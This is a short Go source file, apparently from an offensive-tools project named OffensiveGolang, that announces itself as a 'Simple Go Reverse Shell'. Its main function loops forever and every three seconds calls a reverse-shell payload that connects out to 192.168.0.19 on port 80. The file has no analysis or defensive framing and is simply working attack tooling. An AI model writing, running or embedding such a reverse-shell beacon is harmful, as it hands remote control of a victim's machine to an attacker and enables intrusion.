package main

import (
	"OffensiveGolang/pkg/payloads/rev_shell/rev_shell"
	"fmt"
	"time"
)

func main() {

	fmt.Println("Simple Go Reverse Shell")
	for {
		time.Sleep(3 * time.Second)
		rev_shell.SendShell("192.168.0.19", 80)
	}
}
